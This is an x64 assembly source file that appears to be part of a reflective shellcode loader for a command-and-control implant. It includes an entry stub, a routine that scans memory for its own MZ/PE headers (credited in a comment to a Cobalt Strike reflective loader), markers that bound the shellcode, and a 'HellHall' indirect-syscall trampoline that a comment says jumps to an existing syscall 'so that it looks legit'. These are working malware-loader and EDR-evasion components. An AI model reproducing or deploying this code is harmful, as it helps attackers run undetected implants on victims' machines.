
extern Entry

global Start
global GetRIP
global GetRIPEnd
global HellHall
global SetConfig
global KaynCaller

section .text$A
    Start:
        push    rsi
        mov	rsi, rsp
        and	rsp, 0FFFFFFFFFFFFFFF0h

        sub	rsp, 020h
        call    Entry

        mov	rsp, rsi
        pop	rsi
    ret

section .text$B

    ; Shameless copied from Bobby Cooke CobaltStrikeReflectiveLoader (https://github.com/boku7/CobaltStrikeReflectiveLoader)

    ; I think this returns the addr of KaynCaller - dylan
    KaynCaller:
        call pop
        pop:
        pop rcx    

    ; I think this goes up to find DOS header and try to check if e_lfanew offset returns nt header - dylan
    loop:
        xor r11, r11                ; rbx -> r11
        mov r11d, 0x5A4D            ; ebx -> r11d
        dec rcx
        cmp r11w,  word ds:[ rcx ]  ; bx -> r11w
        jne loop
        xor rax, rax
        mov ax,  [ rcx + 0x3C ]
        add rax, rcx
        xor r11, r11
        add r11w,  0x4550             ; bx -> r11w
        cmp r11w,  word ds:[ rax ]    ; bx -> r11w
        jne loop
        mov rax, rcx
    ret

section .text$F
    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret

section .text$C
    SetConfig:
    	mov r10d, ecx
        mov r11, rdx			
        ret

section .text$C
    HellHall:
        mov eax, r10d		
        mov r10, rcx	
        jmp r11		; JUMPING TO A ADDRESS WHERE WE HAVE `syscall` INSTRUCTION - SO THAT IT LOOKS LEGIT
        ret
    ret

; Random function at the end (5 bytes long) to determine the end of the shellcode
section .text$END
    GetRIPEnd:
        call    retptr
    ret
